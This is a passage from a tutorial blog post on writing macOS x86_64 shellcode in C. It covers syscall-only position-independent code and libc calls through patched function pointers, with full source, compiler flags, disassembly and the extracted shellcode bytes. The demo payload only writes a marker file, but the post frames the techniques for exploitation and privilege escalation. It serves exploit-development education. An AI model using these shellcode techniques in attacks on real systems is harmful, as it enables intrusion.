---
title: "macOS: Shellcoding on Apples (C x64)"
classes: wide
header:
  teaser: /assets/images/ShellcodingOnApples.jpg

ribbon: blue
description: "Pt.3 macOS Shellcoding /W C on x86_64."
categories:
  - MacOS
tags:
  - MacOS
toc: true
---

# Introduction

Hello again! In our previous blogposts we explored shellcoding on `macOS` for both `x86_64` and `ARM64` architectures — But we always wrote our shellcodes by hand in assembly. Writing raw assembly is great for learning and full control, But sometimes you just want a quick, working shellcode without hand-crafting every `push` and `movabs`. So the question for this post: **Can we write our shellcode in `C` and let the compiler do the heavy lifting?** The answer is yes — with rules. The compiler is like a talented but chatty friend: left unattended, it will invite `libc`, the stack protector and `RIP`-relative addressing to the party, And your shellcode dies the moment you `memcpy` it somewhere else. In this post we will learn how to keep the compiler on a leash and get clean, extractable shellcode out of `C` — using **two different methods**, Each with its own trade-offs:

- **Method 1 — Position-Independent, Syscall-Only:** zero `libc`, zero fixed addresses, works anywhere, Any process, Any boot. The purist approach.
- **Method 2 — libc Through Function-Pointer Placeholders:** we keep calling `libc` functions like `execv` — But through pointers holding placeholder addresses, Which we patch with the real runtime addresses before use. Way faster to develop, With one big catch: `ASLR`.

This is a continuation of our shellcoding series, So the `XNU` syscall classes, the `0x2000004`-style encoded numbers and the calling conventions from the first post are assumed known — Method 1 reuses them heavily. And to keep things fair, Both methods will cook the exact same meal: our old friend `echo "W00tW00t" > /tmp/Pwned.txt`, So we can compare apples to apples. Let’s start with our Blogpost.

> You can find all the code on my github: https://github.com/Zeyad-Azima/macOShellcoding

Our environment for this post (this is an `Intel` Mac, so everything here runs natively):

```
~ % sw_vers
ProductName:		macOS
ProductVersion:		26.5.1
BuildVersion:		25F80
~ % uname -m
x86_64
~ % clang --version | head -1
Apple clang version 21.0.0 (clang-2100.0.123.102)
```

> Note: you may have heard that `macOS` ships `gcc`. Run `gcc --version` and you’ll see it’s actually `Apple clang` wearing a `gcc` costume — Apple replaced `GCC` with `LLVM`/`clang` years ago, So that’s what we will use here. Keep in mind that older `GNU gcc` versions arrange code differently in a couple of spots — If you’re following along on a machine with real `gcc`, Expect small differences in the dumps and always trust your own disassembly.

# Limitations

Writing shellcode in `C` sounds like a free lunch, But it comes with a menu of limitations we need to respect. Let’s write our usual payload — `execve("/bin/sh", ["/bin/sh","-c","echo \"W00tW00t\" > /tmp/Pwned.txt"], NULL)` — as plain `C`, compile it, And see what the compiler serves us:

```C
/* bad_shellcode.c — the naive attempt: looks like normal C, breaks as shellcode */
#include <unistd.h>

int main(void) {
    char *argv[] = {"/bin/sh", "-c", "echo \"W00tW00t\" > /tmp/Pwned.txt", NULL};
    char *envp[] = {NULL};

    execve(argv[0], argv, envp);
    return 0;
}
```

```
shellcoding % clang -arch x86_64 -c bad_shellcode.c -o bad_shellcode.o
shellcoding % objdump --disassemble --x86-asm-syntax=intel bad_shellcode.o

bad_shellcode.o:	file format mach-o 64-bit x86-64

Disassembly of section __TEXT,__text:

0000000000000000 <_main>:
       0: 55                           	push	rbp
       1: 48 89 e5                     	mov	rbp, rsp
       4: 48 83 ec 40                  	sub	rsp, 0x40
       8: 48 8b 05 00 00 00 00         	mov	rax, qword ptr [rip]    ## 0xf <_main+0xf>
       f: 48 8b 00                     	mov	rax, qword ptr [rax]
      12: 48 89 45 f8                  	mov	qword ptr [rbp - 0x8], rax
      16: c7 45 c4 00 00 00 00         	mov	dword ptr [rbp - 0x3c], 0x0
      1d: 48 8b 05 00 00 00 00         	mov	rax, qword ptr [rip]    ## 0x24 <_main+0x24>
      24: 48 89 45 d0                  	mov	qword ptr [rbp - 0x30], rax
      28: 48 8b 05 08 00 00 00         	mov	rax, qword ptr [rip + 0x8] ## 0x37 <_main+0x37>
      2f: 48 89 45 d8                  	mov	qword ptr [rbp - 0x28], rax
      33: 48 8b 05 10 00 00 00         	mov	rax, qword ptr [rip + 0x10] ## 0x4a <_main+0x4a>
      3a: 48 89 45 e0                  	mov	qword ptr [rbp - 0x20], rax
      3e: 48 8b 05 18 00 00 00         	mov	rax, qword ptr [rip + 0x18] ## 0x5d <_main+0x5d>
      45: 48 89 45 e8                  	mov	qword ptr [rbp - 0x18], rax
      49: 48 8d 7d c8                  	lea	rdi, [rbp - 0x38]
      4d: 31 f6                        	xor	esi, esi
      4f: ba 08 00 00 00               	mov	edx, 0x8
      54: e8 00 00 00 00               	call	0x59 <_main+0x59>
      59: 48 8b 7d d0                  	mov	rdi, qword ptr [rbp - 0x30]
      5d: 48 8d 75 d0                  	lea	rsi, [rbp - 0x30]
      61: 48 8d 55 c8                  	lea	rdx, [rbp - 0x38]
      65: e8 00 00 00 00               	call	0x6a <_main+0x6a>
      6a: 48 8b 05 00 00 00 00         	mov	rax, qword ptr [rip]    ## 0x71 <_main+0x71>
      71: 48 8b 00                     	mov	rax, qword ptr [rax]
      74: 48 8b 4d f8                  	mov	rcx, qword ptr [rbp - 0x8]
      78: 48 39 c8                     	cmp	rax, rcx
      7b: 75 08                        	jne	0x85 <_main+0x85>
      7d: 31 c0                        	xor	eax, eax
      7f: 48 83 c4 40                  	add	rsp, 0x40
      83: 5d                           	pop	rbp
      84: c3                           	ret
      85: e8 00 00 00 00               	call	0x8a <_main+0x8a>
shellcoding % nm -u bad_shellcode.o
___stack_chk_fail
___stack_chk_guard
_execve
_memset
```

And here is the menu of limitations, revealed by that dump:

| # | Limitation | Evidence in the dump |
|---|------------|----------------------|
| 1 | **`{R\E}IP`-relative addressing** — every string literal and static object is reached with `mov rax, qword ptr [rip]`, which is patched by relocations at link time. Copy this blob somewhere else and those addresses point to garbage | All the `[rip]` loads |
| 2 | **Outsourced calls** — `execve()` and the compiler-inserted `memset()` are `call`s into `libc`. Your extracted blob has no `libc` — those calls jump into the void | `call` instructions + `nm -u` |
| 3 | **Stack protector** — the canary load at the top, the `cmp` + `jne`, and the trailing `call ___stack_chk_fail` are pure overhead you must compile out | `0x8`, `0x6a`–`0x7b`, `0x85` |
| 4 | **Relocations** — a shellcode blob must be reloc-free; anything referencing linked addresses is disqualified | check with `otool -r` |

> Note: notice we always pass `--x86-asm-syntax=intel` to `objdump` — Apple’s default flavor is `AT&T`, And we already suffered enough in assembly, no need to suffer reading it backwards too.

Our two methods attack these limitations from opposite directions: **Method 1** eliminates `libc` entirely (pure syscalls, position-independent), While **Method 2** embraces `libc` — But calls it through addresses we control. Let’s build both.

# Shellcode Creation

## Method 1: Position-Independent, Syscall-Only

Our target shellcode does the same thing as always: `execve("/bin/sh", ["/bin/sh", "-c", "echo \"W00tW00t\" > /tmp/Pwned.txt"], NULL)`. Following our workflow from the previous posts, we already know everything: the syscall numbers with their `BSD` class encoding (`execve` = `0x200003B`, `exit` = `0x2000001`), And the calling conventions (`RDI`, `RSI`, `RDX` for the arguments, `RAX` for the number, then `syscall`).

### Avoid {R|E}IP

This is the heart of the whole technique. Anything in `C` that lives at a **fixed address** — string literals, globals, `static` arrays — becomes a `RIP`-relative reference in the compiled output. `RIP`-relative means “the thing at this distance from *where the code is running*” — perfect for a linked binary that stays put, Fatal for shellcode that gets `memcpy`’d into some `mmap`’d page at a random address. The rule is simple:

> **Every byte your shellcode needs must be created at runtime, on the stack, from immediate values.**

So how do we write that in `C` without the compiler smuggling a string literal in? We do exactly what we did by hand in assembly: `movabs` immediates into stack slots. In `C` that’s just initializing `unsigned long` variables with the little-endian hex of the string — The compiler turns each one into a `movabs rax, <imm64>` + stack store. Let’s decode our strings the same way we did in the assembly post:

- `"/bin/sh\0"` → bytes `2f 62 69 6e 2f 73 68 00` → little-endian `0x0068732f6e69622f`
- `"-c\0"` → bytes `2d 63 00 ...` → little-endian `0x000000000000632d`
- `"echo \"W00tW00t\" > /tmp/Pwned.txt\0"` → 33 bytes → four `unsigned long` immediates + a zero terminator byte:

| Chunk | Bytes (little-endian) | Immediate |
|-------|----------------------|-----------|
| `cmd[0..7]`   | `65 63 68 6f 20 22 57 30` | `0x305722206f686365` |
| `cmd[8..15]`  | `30 74 57 30 30 74 22 20` | `0x2022743030577430` |
| `cmd[16..23]` | `3e 20 2f 74 6d 70 2f 50` | `0x502f706d742f203e` |
| `cmd[24..31]` | `77 6e 65 64 2e 74 78 74` | `0x7478742e64656e77` |
| `cmd[32]`     | `00` | terminator |

And here is our full shellcode in `C` — syscall wrappers via inline assembly (next section), strings as immediates, `argv` array on the stack, `NULL`-terminated:

```C
/* shellcode.c — position-independent, syscall-only C shellcode for macOS x86_64 */
typedef unsigned long u64;

#define SYS_write   0x2000004UL /* (SYSCALL_CLASS_UNIX << 24) | 4  */
#define SYS_execve  0x200003BUL /* (SYSCALL_CLASS_UNIX << 24) | 59 */
#define SYS_exit    0x2000001UL /* (SYSCALL_CLASS_UNIX << 24) | 1  */

static u64 sc3(u64 n, u64 a, u64 b, u64 c)
{
    u64 ret;
    __asm__ __volatile__("syscall"
                         : "=a"(ret)
                         : "a"(n), "D"(a), "S"(b), "d"(c)
                         : "rcx", "r11", "memory");
    return ret;
}

int main(void)
{
    /* strings built from immediates on the stack — never a pointer into static data */
    volatile u64 s_sh = 0x0068732f6e69622fUL; /* "/bin/sh\0" */
    volatile u64 s_c  = 0x000000000000632dUL; /* "-c\0"      */

    /* "echo \"W00tW00t\" > /tmp/Pwned.txt\0" — 33 bytes, as 4 immediates + terminator */
    volatile char cmd[33];
    *(volatile u64 *)&cmd[0]  = 0x305722206f686365UL;
    *(volatile u64 *)&cmd[8]  = 0x2022743030577430UL;
    *(volatile u64 *)&cmd[16] = 0x502f706d742f203eUL;
    *(volatile u64 *)&cmd[24] = 0x7478742e64656e77UL;
    cmd[32] = 0;

    /* argv array on the stack — pointers to our stack strings, NULL-terminated */
    u64 argv[4];
    argv[0] = (u64)&s_sh;
    argv[1] = (u64)&s_c;
    argv[2] = (u64)cmd;
    argv[3] = 0;

    sc3(SYS_execve, (u64)&s_sh, (u64)argv, 0);
    sc3(SYS_exit, 0, 0, 0);
    __builtin_unreachable();
}
```

A few things to notice here:

- The `volatile` keywords are not decoration — they force every store to actually happen, in order, and stop `-O2` from eliding anything the inline asm can’t see. Shellcode is no place for clever elision.
- `argv[3] = 0` — our `NULL` terminator, the same trap we hit in the `ARM64` post. The `C` compiler adds it silently in normal code; here we place it ourselves.
- `__builtin_unreachable()` after the final `exit` — tells the compiler there’s no way back, so it doesn’t generate any return path (you’ll see it emit a `ud2` — a “this should never execute” trap — as the last instruction. It never does.)
- The syscall numbers are the exact same `BSD`-encoded tickets from our first post: `(SYSCALL_CLASS_UNIX << 24) | syscall_number`.

Now the compile line — this is where the leash is:

```
shellcoding % clang -arch x86_64 -c -O2 -ffreestanding -fno-stack-protector -fno-builtin shellcode.c -o shellcode.o
shellcoding % nm -u shellcode.o
shellcoding % objdump --disassemble --x86-asm-syntax=intel shellcode.o

shellcode.o:	file format mach-o 64-bit x86-64

Disassembly of section __TEXT,__text:

0000000000000000 <_main>:
       0: 55                           	push	rbp
       1: 48 89 e5                     	mov	rbp, rsp
       4: 48 b8 2f 62 69 6e 2f 73 68 00	movabs	rax, 0x68732f6e69622f
       e: 48 89 45 f0                  	mov	qword ptr [rbp - 0x10], rax
      12: 48 c7 45 f8 2d 63 00 00      	mov	qword ptr [rbp - 0x8], 0x632d
      1a: 48 b8 65 63 68 6f 20 22 57 30	movabs	rax, 0x305722206f686365
      24: 48 89 45 c0                  	mov	qword ptr [rbp - 0x40], rax
      28: 48 b8 30 74 57 30 30 74 22 20	movabs	rax, 0x2022743030577430
      32: 48 89 45 c8                  	mov	qword ptr [rbp - 0x38], rax
      36: 48 b8 3e 20 2f 74 6d 70 2f 50	movabs	rax, 0x502f706d742f203e
      40: 48 89 45 d0                  	mov	qword ptr [rbp - 0x30], rax
      44: 48 b8 77 6e 65 64 2e 74 78 74	movabs	rax, 0x7478742e64656e77
      4e: 48 89 45 d8                  	mov	qword ptr [rbp - 0x28], rax
      52: c6 45 e0 00                  	mov	byte ptr [rbp - 0x20], 0x0
      56: 48 8d 7d f0                  	lea	rdi, [rbp - 0x10]
      5a: 48 89 7d a0                  	mov	qword ptr [rbp - 0x60], rdi
      5e: 48 8d 45 f8                  	lea	rax, [rbp - 0x8]
      62: 48 89 45 a8                  	mov	qword ptr [rbp - 0x58], rax
      66: 48 8d 45 c0                  	lea	rax, [rbp - 0x40]
      6a: 48 89 45 b0                  	mov	qword ptr [rbp - 0x50], rax
      6e: 48 c7 45 b8 00 00 00 00      	mov	qword ptr [rbp - 0x48], 0x0
      76: 48 8d 75 a0                  	lea	rsi, [rbp - 0x60]
      7a: b8 3b 00 00 02               	mov	eax, 0x200003b
      7f: 31 d2                        	xor	edx, edx
      81: 0f 05                        	syscall
      83: b8 01 00 00 02               	mov	eax, 0x2000001
      88: 31 ff                        	xor	edi, edi
      8a: 31 f6                        	xor	esi, esi
      8c: 31 d2                        	xor	edx, edx
      8e: 0f 05                        	syscall
      90: 0f 0b                        	ud2
```

Look at that. `nm -u` printed **nothing** — zero undefined symbols. No `[rip]` anywhere. Every string is a `movabs` immediate stored to the stack — the compiler literally generated the same `movabs + mov [rbp-x], rax` pattern we hand-wrote in the assembly post. The `argv` array is built with `lea rbp`-relative addresses (stack addresses — computed at runtime, position-independent by nature), And both syscalls are right there: `mov eax, 0x200003b` + `syscall`, then the `exit` fallback. The `ud2` at the end is the `__builtin_unreachable()` trap — unreachable, since `exit` never returns.

> Note: watch the flags, they are not optional. Drop `-O2` and the compiler stops inlining `sc3()` — you get real `call` instructions to your own wrapper, splitting the blob into pieces. Drop `-fno-stack-protector` and (depending on the toolchain version) a canary + `___stack_chk_fail` sneaks in. Drop `-ffreestanding`/`-fno-builtin` and the compiler starts “helping” by calling `memset` and friends. Always verify with `nm -u` (must print nothing) and `grep rip` on the disassembly (must print nothing).

### Avoid outsourced calls

The second rule: **the shellcode can only call the kernel**. Every `call` instruction in the final blob is a liability — `call rel32` to a function that got linked elsewhere is a one-way ticket to `SIGSEGV` once the blob is relocated. That means:

- **No `libc` functions.** `execve()`, `write()`, `memset()`, `printf()` — all outsourced. We replace them with our own inline-assembly syscall wrappers:

```C
static u64 sc3(u64 n, u64 a, u64 b, u64 c)
{
    u64 ret;
    __asm__ __volatile__("syscall"
                         : "=a"(ret)
                         : "a"(n), "D"(a), "S"(b), "d"(c)
                         : "rcx", "r11", "memory");
    return ret;
}
```

    Reading the constraints: `"a"(n)` puts the encoded syscall number in `RAX`, `"D"(a)`, `"S"(b)`, `"d"(c)` load `RDI`, `RSI`, `RDX` with the three arguments — the exact calling convention from our first post. The clobbers list tells the compiler that `RCX` and `R11` get destroyed by the `syscall` instruction (they hold `RIP` and `RFLAGS` after the trap) and that `"memory"` may be read/written — so the compiler won’t reorder our stack-string stores past the syscall. Need more arguments? Add `sc4`, `sc5`... with `"r"(d)` constraints mapping into `R10` (note: the 4th kernel argument is `R10`, not `RCX` — `syscall` overwrites `RCX`).

- **No function calls you didn’t inline.** That’s why `-O2` matters: our tiny `static` wrapper gets inlined at every call site, so the final blob has zero `call` instructions. Verify it — `grep call` on the disassembly must come back empty (ours does: only `push`, `mov`, `lea`, `xor`, `syscall`).
- **No standard headers pulling in magic.** We only use our own `typedef` and `#define`s. Headers like `<unistd.h>` are fine for *reading* function signatures, But don’t call anything from them.

The verification ritual before extracting — all three must be silent:

```
shellcoding % nm -u shellcode.o
shellcoding % objdump --disassemble --x86-asm-syntax=intel shellcode.o | grep -i "\[rip"
shellcoding % otool -r shellcode.o

shellcode.o:
```

No undefined symbols, No `RIP`-relative memory operands, No relocations. The blob is free to live anywhere.

## Method 2: libc Through Function-Pointers Placeholders

Method 1 is bulletproof — But writing something bigger, Like a `bind shell`, with raw syscall wrappers means hand-declaring `struct sockaddr_in` layouts, Byte-swapping ports by hand and juggling five different syscall numbers. Since we can call **any function we want** in `C`, development would be much faster if we could just... call `libc`. And we can — with a trick: we declare the function **ourselves** as a function-pointer type, Initialize it with a **placeholder address**, And patch that placeholder with `execv`’s real runtime address before the shellcode ever runs.

The catch first, So you can decide where this method applies: the addresses we hardcode are **position-dependent** — `ASLR` randomizes `libc`’s location in the shared cache **once per boot**. The address we bake in today is garbage after the next reboot. That means this method needs **code execution on the target first** — So we can look up the real addresses at runtime — Which makes it perfect for **local exploitation** (privilege escalation, post-exploitation), And the wrong tool for a fire-and-forget remote payload. Choose your weapon per scenario.

### Same Payload, Different Strategy

Remember the two problems our `bad_shellcode.o` dump exposed in the `Limitations` section? The `[rip]`-relative string, And the `call` into `libc`’s stub. Method 1’s answer was “eliminate `libc`”. Method 2’s answer is sneakier:

1. **The string problem** — we solve it exactly like Method 1: our `u64` immediate chunks on the stack. Reuse the same chunk table, No new homework.
2. **The stub problem** — instead of replacing `execv()` with a raw syscall, we **keep the call — but redirect it**: we declare `execv`’s signature ourselves as a function-pointer type, Initialize the pointer with a placeholder value, And the compiler emits a `call register` through our variable instead of a `call` into the `__stubs` section. Later, We patch the placeholder with the real runtime address of `execv`.

The compile line is lighter this time — we don’t need `-ffreestanding` or `-fno-builtin` (we’re not hiding from `libc`, we’re just not calling it *by name*), But we still take the canary off:

```
clang -arch x86_64 -c -fno-stack-protector shellcode_m2.c -o shellcode_m2.o
```

### Building Strings Without the Compiler’s Help

First attempt — the classic trick you’ll see recommended: declare the string as a `char` array with character initializers, Hoping the compiler materializes it inside the code:

```C
char b[] = {'/','b','i','n','/','s','h',0};
```

On older `gcc` versions this worked — But our `Apple clang 21` is smarter than we’d like: **it constant-folds the array back into a `__cstring` literal** and copies it in with `rip`-relative loads — Even with `volatile`, Even at `-O0`:

```
; what clang 21 actually emits for the initializer above (still rip-dependent!):
100000478: 66 8b 05 33 00 00 00  mov	ax, word ptr [rip + 0x33]
10000047f: 66 89 45 f8          	mov	word ptr [rbp - 0x8], ax
100000483: 48 8b 05 20 00 00 00 	mov	rax, qword ptr [rip + 0x20]
10000048a: 48 89 45 f0          	mov	qword ptr [rbp - 0x10], rax
```

The compiler outsmarted the trick. So we go back to our own recipe from Method 1 — immediates the compiler **cannot** fold, Because they’re just numbers being moved into stack slots:

```C
volatile u64 s_sh = 0x0068732f6e69622fUL;   /* "/bin/sh\0" */
volatile u64 s_c  = 0x000000000000632dUL;   /* "-c\0"      */

volatile char cmd[33];
*(volatile u64 *)&cmd[0]  = 0x305722206f686365UL;
*(volatile u64 *)&cmd[8]  = 0x2022743030577430UL;
*(volatile u64 *)&cmd[16] = 0x502f706d742f203eUL;
*(volatile u64 *)&cmd[24] = 0x7478742e64656e77UL;
cmd[32] = 0;
```

Same chunk table as Method 1 — One payload, One set of homework. For very short strings you can also do element-wise assignments (`b[0] = '/'; b[1] = 'b'; ...`) — Each becomes its own `mov byte ptr [rbp - x], imm8`, Which clang also can’t fold. Pick whichever reads better for your shellcode.

### Calling libc Through a Placeholder

Now the stub problem. `execv`’s real signature (from `Libc`’s `unistd.h`) is:

```C
int execv(const char *path, char *const argv[]);
```

We declare that signature **ourselves** as a function-pointer type, create a variable of it, And cast our placeholder address into it — This works because functions in `C` are just memory addresses, And calling through the pointer emits an indirect `call register` instead of a linked `call`:

```C
/* shellcode_m2.c — Method 2: libc through function-pointer placeholders */
typedef unsigned long u64;

int main(void)
{
    /* execv's real signature: int execv(const char *path, char *const argv[]); */
    typedef int *(*execv_t)(const char *, char *const *);
    execv_t my_execv = (execv_t)0x1122334455667788;   /* placeholder — patched with the real one below */

    volatile u64 s_sh = 0x0068732f6e69622fUL;   /* "/bin/sh\0" */
    volatile u64 s_c  = 0x000000000000632dUL;   /* "-c\0"      */

    /* "echo \"W00tW00t\" > /tmp/Pwned.txt\0" — same chunks as Method 1 */
    volatile char cmd[33];
    *(volatile u64 *)&cmd[0]  = 0x305722206f686365UL;
    *(volatile u64 *)&cmd[8]  = 0x2022743030577430UL;
    *(volatile u64 *)&cmd[16] = 0x502f706d742f203eUL;
    *(volatile u64 *)&cmd[24] = 0x7478742e64656e77UL;
    cmd[32] = 0;

    char *argv[4];
    argv[0] = (char *)&s_sh;   /* argv[0] must be the same path */
    argv[1] = (char *)&s_c;
    argv[2] = cmd;
    argv[3] = 0;               /* NULL-terminated */

    my_execv((char *)&s_sh, argv);
    return 0;
}
```

> Note: no `<unistd.h>` include at all — we don’t refer to the real `execv` by name anywhere, So there is nothing for the linker to resolve. Also keep our `NULL`-terminator discipline on `argv` from the previous posts — the compiler isn’t adding it for us here.

Compile and disassemble:

```
shellcoding % clang -arch x86_64 -c -fno-stack-protector shellcode_m2.c -o shellcode_m2.o
shellcoding % nm -u shellcode_m2.o
shellcoding % objdump --disassemble --x86-asm-syntax=intel shellcode_m2.o

shellcode_m2.o:	file format mach-o 64-bit x86-64

Disassembly of section __TEXT,__text:

0000000000000000 <_main>:
       0: 55                           	push	rbp
       1: 48 89 e5                     	mov	rbp, rsp
       4: 48 83 ec 70                  	sub	rsp, 0x70
       8: c7 45 fc 00 00 00 00         	mov	dword ptr [rbp - 0x4], 0x0
       f: 48 b8 88 77 66 55 44 33 22 11	movabs	rax, 0x1122334455667788
      19: 48 89 45 f0                  	mov	qword ptr [rbp - 0x10], rax
      1d: 48 b8 2f 62 69 6e 2f 73 68 00	movabs	rax, 0x68732f6e69622f
      27: 48 89 45 e8                  	mov	qword ptr [rbp - 0x18], rax
      2b: 48 c7 45 e0 2d 63 00 00      	mov	qword ptr [rbp - 0x20], 0x632d
      33: 48 b8 65 63 68 6f 20 22 57 30	movabs	rax, 0x305722206f686365
      3d: 48 89 45 b0                  	mov	qword ptr [rbp - 0x50], rax
      41: 48 b8 30 74 57 30 30 74 22 20	movabs	rax, 0x2022743030577430
      4b: 48 89 45 b8                  	mov	qword ptr [rbp - 0x48], rax
      4f: 48 b8 3e 20 2f 74 6d 70 2f 50	movabs	rax, 0x502f706d742f203e
      59: 48 89 45 c0                  	mov	qword ptr [rbp - 0x40], rax
      5d: 48 b8 77 6e 65 64 2e 74 78 74	movabs	rax, 0x7478742e64656e77
      67: 48 89 45 c8                  	mov	qword ptr [rbp - 0x38], rax
      6b: c6 45 d0 00                  	mov	byte ptr [rbp - 0x30], 0x0
      6f: 48 8d 45 e8                  	lea	rax, [rbp - 0x18]
      73: 48 89 45 90                  	mov	qword ptr [rbp - 0x70], rax
      77: 48 8d 45 e0                  	lea	rax, [rbp - 0x20]
      7b: 48 89 45 98                  	mov	qword ptr [rbp - 0x68], rax
      7f: 48 8d 45 b0                  	lea	rax, [rbp - 0x50]
      83: 48 89 45 a0                  	mov	qword ptr [rbp - 0x60], rax
      87: 48 c7 45 a8 00 00 00 00      	mov	qword ptr [rbp - 0x58], 0x0
      8f: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
      93: 48 8d 75 90                  	lea	rsi, [rbp - 0x70]
      97: 48 8d 7d e8                  	lea	rdi, [rbp - 0x18]
      9b: ff d0                        	call	rax
      9d: 31 c0                        	xor	eax, eax
      9f: 48 83 c4 70                  	add	rsp, 0x70
      a3: 5d                           	pop	rbp
      a4: c3                           	ret
```

No `__stubs`, No `[rip]`, `nm -u` silent — the call went through `call rax`, And the target address sits inside our code as the `movabs rax, 0x1122334455667788` placeholder. Fully self-contained. Both problems solved — Now we just need a real address to patch in.

### Hunting the Real Address at Runtime

Since functions in `C` are just memory addresses, We can simply print `execv`’s value from any running process:

```C
/* getaddress.c — fetch execv's runtime address */
#include <unistd.h>
#include <stdio.h>

int main(void)
{
    printf("0x%lx\n", (unsigned long)execv);
}
```

```
shellcoding % clang -arch x86_64 getaddress.c -o getaddress
shellcoding % ./getaddress
0x7ff80c62a967
shellcoding % ./getaddress
0x7ff80c62a967
shellcoding % clang -arch x86_64 getaddress.c -o getaddress2
shellcoding % ./getaddress2
0x7ff80c62a967
```

Notice two things: the address is the **same across different binaries and different runs** — Cause `libc` lives in the shared cache, Which `ASLR` slides **once per boot** and then leaves alone. So `0x7ff80c62a967` is valid on this machine **until the next reboot** — This is exactly why Method 2 is a *local exploitation* technique: get code execution, Read the address, Ship the shellcode — All within the same boot.

### Patch, Extract, Load

Now we replace the placeholder with the real address and rebuild:

```C
    execv_t my_execv = (execv_t)0x7ff80c62a967;   /* fetched at runtime — valid until reboot */
```

> Note: in a real exploitation scenario you wouldn’t hardcode it by hand either — Your first-stage code would resolve the address at runtime (parse the shared cache, Or simply read it from a process you already control) and write it into the placeholder before executing the blob. For the lab, Compiling it in is enough to prove the concept.

Let’s prove it twice — First as a linked binary, Then as real shellcode in our loader. Linked:

```
shellcoding % sed 's/0x1122334455667788/0x7ff80c62a967/' shellcode_m2.c > shellcode_m2_final.c
shellcoding % clang -arch x86_64 -fno-stack-protector shellcode_m2_final.c -o sc_m2
shellcoding % rm -f /tmp/Pwned.txt
shellcoding % ./sc_m2
shellcoding % echo $?
0
shellcoding % cat /tmp/Pwned.txt
W00tW00t
```

And now the full circle — extract the blob and feed it to our fork-based `RWX` loader:

```
shellcoding % clang -arch x86_64 -c -fno-stack-protector shellcode_m2_final.c -o shellcode_m2_final.o
shellcoding % segedit shellcode_m2_final.o -extract __TEXT __text sc_m2_bytes.bin
shellcoding % wc -c sc_m2_bytes.bin
     165 sc_m2_bytes.bin
shellcoding % xxd sc_m2_bytes.bin | head -3
00000000: 5548 89e5 4883 ec70 c745 fc00 0000 0048  UH..H..p.E.....H
00000010: b867 a962 0cf8 7f00 0048 8945 f048 b82f  .g.b.....H.E.H./
00000020: 6269 6e2f 7368 0048 8945 e848 c745 e02d  bin/sh.H.E.H.E.-
```

`165` bytes — And look at offset `0x11`: `67 a9 62 0c f8 7f 00 00` = our `0x7ff80c62a967` in little-endian, Baked into the blob. Generate the header (with `xxd -i`, Never by hand — more on that below), And load it with the same fork-based loader from Method 1:

```
shellcoding % xxd -i sc_m2_bytes.bin > sc_m2_bytes.h
shellcoding % clang -arch x86_64 -o cloader_m2 cloader_m2.c
shellcoding % rm -f /tmp/Pwned.txt
shellcoding % ./cloader_m2
[parent 95793] spawned child 95796, waiting...
[child 95796] executing shellcode (165 bytes)...
[parent] child exited with status 0
[parent] Success: '/tmp/Pwned.txt' exists.
shellcoding % cat /tmp/Pwned.txt
W00tW00t
```

Our `C`-written shellcode — calling `libc` through an address we hardcoded — Extracted, Loaded into an anonymous `RWX` page, And the file is there. Full circle, Method 2 edition.

> Note: want the `nasm` route instead of the loader? Same conversion rules as our first post — drop the `ptr` keywords, Rename `movabs` to `mov`, Replace the placeholder with the real address — Then `nasm -f macho64` + `ld -lSystem -e _main` and you have a standalone binary, Just like old times.

> Warning: a story from the testing of this very post. On my first extraction run, I grabbed the bytes from the **unpatched** object — placeholder `0x1122334455667788` still baked in. The linked binary wasn’t tested, Straight to the loader — And the child died instantly: `SIGSEGV`, faulting address `0x0`, `RIP` frozen on the `call rax`. That’s the classic signature of a **general-protection fault**: `0x1122334455667788` is a *non-canonical* address on `x86_64` (bits above `47` are set wrong), So the CPU refuses the control transfer before it even starts. So if your Method 2 shellcode dies with `si_addr = 0x0` right at the `call` — You forgot to patch the placeholder. The address hunt is not optional.

### Method 1 vs Method 2

| | Method 1 — Syscall-Only | Method 2 — Function Pointers |
|---|---|---|
| Position independence | Fully `PIC` — works at any address, Any process, Any boot | Position-dependent — addresses valid **until reboot** |
| `libc` usage | None — raw syscalls via inline asm | Full `libc` (`execv`, `socket`, `htons`...) through placeholders |
| Prerequisite for use | Nothing — fire and forget | Code execution on target first, To read the real addresses |
| Best scenario | Remote payloads, Memory-corruption exploits | Local exploitation, Privilege escalation, Post-exploitation |
| Dev speed | Slower — hand-rolled structs & syscall numbers | Fast — normal `C` with real functions |
| Failure signature if stale | Immune to `ASLR` | `SIGSEGV` with `si_addr = 0x0` at the call — patch your placeholders |

## Execute shellcode

Now let’s do Method 1’s extraction in full detail — first prove the `C` shellcode runs as a normal binary, Then extract it and run it as real shellcode from a loader.

**Stage 1 — run it linked.** We link the object into an executable with our `main` as the entry point (`ld` wants the symbol name `_main`, which is exactly what our C `main` compiles to):

```
shellcoding % ld -o sc shellcode.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX26.5.sdk/usr/lib -lSystem -e _main -platform_version macos 26.5 26.5
shellcoding % rm -f /tmp/Pwned.txt
shellcoding % ./sc
shellcoding % echo $?
0
shellcoding % ls -la /tmp/Pwned.txt
-rw-r--r--  1 zeyadazima.com  wheel  9 Sep 17 00:46 /tmp/Pwned.txt
shellcoding % cat /tmp/Pwned.txt
W00tW00t
```

The `C` shellcode runs and does its job. (`-lSystem` is only there because `ld` refuses to produce a dynamic executable without it — our object imports nothing from it.)

**Stage 2 — extract the blob.** Same pipeline as our `x86_64` assembly post — `objdump` with Intel syntax, grab the hex bytes, convert:

```
shellcoding % objdump --disassemble --x86-asm-syntax=intel shellcode.o > sc.disasm
shellcoding % grep -E '^[[:space:]]+[0-9a-f]+:' sc.disasm \
  | awk '{for(i=2;i<=NF;i++) if ($i ~ /^[0-9a-f]{2}$/) printf "%s", $i}' \
  | tr -d '\n' > shellcode.hex
shellcoding % cat shellcode.hex 
554889e548b82f62696e2f736800488945f048c745f82d63000048b86563686f20225730488945c048b83074573030742220488945c848b83e202f746d702f50488945d048b8776e65642e747874488945d8c645e000488d7df048897da0488d45f8488945a8488d45c0488945b048c745b800000000488d75a0b83b00000231d20f05b80100000231ff31f631d20f050f0b
shellcoding % xxd -r -p shellcode.hex > shellcode.bin
shellcoding % wc -c shellcode.bin
     146 shellcode.bin // 146 bytes
```

`146` bytes of shellcode, written in `C`. And since we’re on `x86_64`, the `otool` cross-check matches byte-for-byte:

```
shellcoding % otool -s __TEXT __text shellcode.o | sed -n '3,$p' \
  | awk '{ for(i=2;i<=NF;i++) printf "%s",$i } END{ print "" }' \
  | xxd -r -p | cmp - shellcode.bin && echo IDENTICAL
IDENTICAL
shellcoding % xxd shellcode.bin | head -2
